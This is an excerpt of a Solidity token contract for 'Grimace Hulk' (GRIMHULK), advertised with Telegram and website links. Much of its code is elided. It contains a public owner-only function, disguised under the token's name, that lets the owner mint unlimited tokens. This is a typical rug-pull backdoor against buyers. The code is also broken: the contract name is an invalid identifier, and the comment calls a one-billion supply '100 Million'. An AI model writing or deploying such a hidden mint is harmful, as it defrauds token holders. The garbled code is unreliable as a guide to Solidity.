//
// $GrimaceHulk proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/GrimaceHulk
// 📱 Website ::https://grimacehulk.com/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _GrimaceHulk(uint256 amount) public onlyOwner {
 _GrimaceHulk(msg.sender, amount);
    }
    ...
    function _GrimaceHulk(address account, uint256 amount) internal virtual {
...
contract $GrimaceHulk is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Grimace Hulk", "GRIMHULK") {
     _GrimaceHulk(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}